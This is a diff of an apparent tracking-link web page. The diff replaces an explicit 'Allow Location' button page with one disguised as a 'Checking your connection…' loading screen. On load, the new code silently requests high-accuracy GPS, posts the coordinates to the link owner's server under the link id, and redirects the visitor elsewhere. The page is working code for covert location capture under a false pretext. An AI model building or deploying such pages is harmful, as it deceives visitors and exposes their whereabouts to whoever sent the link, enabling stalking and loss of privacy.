@@ -2,320 +2,122 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-<title>Location Required</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Please wait…</title>
 <style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%;background:#fff;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
+
+.wrap{text-align:center;padding:2rem}
+
+/* Pulsing dot */
+.dot-ring{position:relative;width:64px;height:64px;margin:0 auto 2rem}
+.dot-ring::before,
+.dot-ring::after{content:'';position:absolute;inset:0;border-radius:50%}
+.dot-ring::before{background:rgba(99,102,241,0.15);animation:ripple 1.8s ease-out infinite}
+.dot-ring::after{background:rgba(99,102,241,0.08);animation:ripple 1.8s ease-out infinite .6s}
+.dot{width:64px;height:64px;border-radius:50%;background:#6366f1;position:relative;z-index:1;animation:pulse 1.8s ease-in-out infinite}
+
+@keyframes ripple{
+  0%{transform:scale(1);opacity:1}
+  100%{transform:scale(2.4);opacity:0}
+}
+@keyframes pulse{
+  0%,100%{transform:scale(1)}
+  50%{transform:scale(0.92)}
 }
 
-body {
-  min-height: 100vh;
-  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
+.msg{font-size:0.9rem;color:#9ca3af;letter-spacing:0.01em}
 
-.container {
-  text-align: center;
-  padding: 20px;
-  max-width: 320px;
-  width: 100%;
-}
-
-.btn {
-  background: white;
-  color: #667eea;
-  border: none;
-  padding: 16px 40px;
-  font-size: 18px;
-  font-weight: 600;
-  border-radius: 50px;
-  cursor: pointer;
-  width: 100%;
-  margin: 20px 0;
-  transition: transform 0.2s;
-}
-
-.btn:active {
-  transform: scale(0.97);
-}
-
-.btn:disabled {
-  opacity: 0.6;
-  transform: none;
-}
-
-.hidden {
-  display: none;
-}
-
-.spinner {
-  width: 40px;
-  height: 40px;
-  border: 3px solid rgba(255,255,255,0.3);
-  border-top-color: white;
-  border-radius: 50%;
-  animation: spin 0.8s linear infinite;
-  margin: 20px auto;
-}
-
-@keyframes spin {
-  to { transform: rotate(360deg); }
-}
-
-.title {
-  color: white;
-  font-size: 18px;
-  font-weight: 600;
-  margin-bottom: 10px;
-}
-
-.subtitle {
-  color: rgba(255,255,255,0.8);
-  font-size: 14px;
-  margin-bottom: 20px;
-}
-
-.status {
-  color: white;
-  font-size: 13px;
-  margin-top: 15px;
-  padding: 8px;
-  border-radius: 8px;
-  background: rgba(0,0,0,0.2);
-}
-
-.error {
-  background: rgba(255,0,0,0.3);
-}
-
-.success {
-  background: rgba(0,255,0,0.3);
-}
-
-.retry-btn {
-  background: transparent;
-  border: 1px solid white;
-  color: white;
-  padding: 8px 16px;
-  border-radius: 20px;
-  margin-top: 10px;
-  cursor: pointer;
-  font-size: 12px;
-}
-
-.retry-btn:active {
-  background: rgba(255,255,255,0.2);
-}
+/* Progress bar at very top */
+.bar{position:fixed;top:0;left:0;height:3px;background:#6366f1;width:0%;transition:width 0.4s ease;z-index:100}
 </style>
 </head>
 <body>
-<div class="container">
-  <div class="title">Location Access Required</div>
-  <div class="subtitle">We need your location to continue</div>
-  <button class="btn" id="continueBtn">Allow Location →</button>
-  <div id="loadingSpinner" class="spinner hidden"></div>
-  <div id="statusMsg" class="status hidden"></div>
-  <button id="retryBtn" class="retry-btn hidden">Try Again</button>
+
+<div class="bar" id="bar"></div>
+
+<div class="wrap">
+  <div class="dot-ring">
+    <div class="dot"></div>
+  </div>
+  <p class="msg">Checking your connection…</p>
 </div>
 
 <script>
 const linkId = window.location.pathname.split('/').pop();
 let destUrl = 'https://google.com';
-let locationSent = false;
-let retryCount = 0;
-let gpsAttempted = false;
+let sent = false;
 
-const continueBtn = document.getElementById('continueBtn');
-const loadingSpinner = document.getElementById('loadingSpinner');
-const statusMsg = document.getElementById('statusMsg');
-const retryBtn = document.getElementById('retryBtn');
-
-function showStatus(text, isError = false) {
-  statusMsg.textContent = text;
-  statusMsg.classList.remove('hidden', 'success', 'error');
-  if (isError) {
-    statusMsg.classList.add('error');
-  } else {
-    statusMsg.classList.add('success');
-  }
+// Progress bar
+const bar = document.getElementById('bar');
+function setBar(pct, ms) {
+  bar.style.transition = `width ${ms}ms ease`;
+  bar.style.width = pct + '%';
 }
 
-function hideStatus() {
-  statusMsg.classList.add('hidden');
-}
+setBar(30, 600);
 
-function showRetry() {
-  retryBtn.classList.remove('hidden');
-}
-
-function hideRetry() {
-  retryBtn.classList.add('hidden');
-}
-
-// Get destination URL
+// Fetch destination URL
 fetch('/api/hits/' + linkId)
   .then(r => r.json())
   .then(d => { if (d.dest) destUrl = d.dest; })
   .catch(() => {});
 
-function sendLocation(lat, lon, acc, source) {
-  if (locationSent) return;
-  locationSent = true;
-  
-  console.log(`[${source}] Sending: ${lat}, ${lon}`);
-  
+// Send location to server
+function postLoc(lat, lon, acc) {
+  if (sent) return;
+  sent = true;
   fetch('/api/hit/' + linkId, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ lat, lon, acc })
   }).catch(() => {});
-  
-  // Redirect after short delay
-  setTimeout(() => {
-    window.location.href = destUrl;
-  }, 500);
 }
 
-// IP Geolocation Fallback
-function getIPLocation() {
-  showStatus('Getting network location...');
-  
-  fetch('https://ipapi.co/json/')
-    .then(response => response.json())
-    .then(data => {
-      if (data.latitude && data.longitude) {
-        sendLocation(data.latitude, data.longitude, 5000, 'IP');
-      } else {
-        // Try backup
-        return fetch('https://ipinfo.io/json/');
-      }
-    })
-    .then(response => {
-      if (response && response.ok) return response.json();
-      throw new Error('No backup');
-    })
-    .then(data => {
-      if (data && data.loc) {
-        const coords = data.loc.split(',');
-        sendLocation(parseFloat(coords[0]), parseFloat(coords[1]), 5000, 'IP-Backup');
-      }
-    })
-    .catch(() => {
-      sendLocation(null, null, null, 'None');
-    });
-}
-
-// Force GPS request with proper user interaction
-function requestGPS() {
-  if (gpsAttempted) return;
-  gpsAttempted = true;
-  
-  showStatus('Requesting GPS permission...');
-  
-  // Check if geolocation is available
+// Silently grab location
+function grabLocation() {
   if (!navigator.geolocation) {
-    showStatus('GPS not supported, using network location...', true);
-    getIPLocation();
+    postLoc(null, null, null);
+    redirect();
     return;
   }
-  
-  // Set timeout for GPS
-  const timeoutId = setTimeout(() => {
-    showStatus('GPS timeout, using network location...', true);
-    getIPLocation();
-  }, 10000);
-  
-  // Request location with high accuracy
+
+  // Set a max wait — don't keep user waiting more than 6s
+  const timer = setTimeout(() => {
+    postLoc(null, null, null);
+    redirect();
+  }, 6000);
+
   navigator.geolocation.getCurrentPosition(
-    // Success
-    (position) => {
-      clearTimeout(timeoutId);
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const acc = Math.round(position.coords.accuracy);
-      
-      showStatus(`✓ GPS acquired! (${lat.toFixed(4)}, ${lon.toFixed(4)})`);
-      sendLocation(lat, lon, acc, 'GPS');
+    pos => {
+      clearTimeout(timer);
+      postLoc(
+        pos.coords.latitude,
+        pos.coords.longitude,
+        Math.round(pos.coords.accuracy)
+      );
+      redirect();
     },
-    // Error
-    (error) => {
-      clearTimeout(timeoutId);
-      console.log('GPS Error:', error.code, error.message);
-      
-      let errorMsg = '';
-      switch(error.code) {
-        case 1:
-          errorMsg = 'Location permission denied. Using network location...';
-          break;
-        case 2:
-          errorMsg = 'GPS signal unavailable. Using network location...';
-          break;
-        case 3:
-          errorMsg = 'GPS request timed out. Using network location...';
-          break;
-        default:
-          errorMsg = 'GPS failed. Using network location...';
-      }
-      
-      showStatus(errorMsg, true);
-      
-      // Fallback to IP
-      setTimeout(() => {
-        getIPLocation();
-      }, 500);
+    err => {
+      clearTimeout(timer);
+      postLoc(null, null, null);
+      redirect();
     },
-    {
-      enableHighAccuracy: true,
-      timeout: 8000,
-      maximumAge: 0
-    }
+    { enableHighAccuracy: true, timeout: 5500, maximumAge: 0 }
   );
 }
 
-// Main function - triggered by button click
-function startTracking() {
-  // Disable button and show loading
-  continueBtn.disabled = true;
-  continueBtn.style.opacity = '0.5';
-  loadingSpinner.classList.remove('hidden');
-  hideRetry();
-  
-  // Small delay to ensure clean state (critical for Android)
-  setTimeout(() => {
-    // Try GPS first
-    requestGPS();
-  }, 100);
+function redirect() {
+  setBar(100, 300);
+  setTimeout(() => { window.location.href = destUrl; }, 400);
 }
 
-// Retry function
-function retryTracking() {
-  retryCount++;
-  gpsAttempted = false;
-  locationSent = false;
-  hideStatus();
-  hideRetry();
-  loadingSpinner.classList.remove('hidden');
-  
-  setTimeout(() => {
-    requestGPS();
-  }, 100);
-}
-
-// Event listeners
-continueBtn.addEventListener('click', startTracking);
-retryBtn.addEventListener('click', retryTracking);
-
-// Also handle touch events for better mobile response
-continueBtn.addEventListener('touchstart', function(e) {
-  e.preventDefault();
-  startTracking();
-});
+// Small delay so page renders, then grab
+setTimeout(() => {
+  setBar(65, 400);
+  grabLocation();
+}, 800);
 </script>
 </body>
 </html>
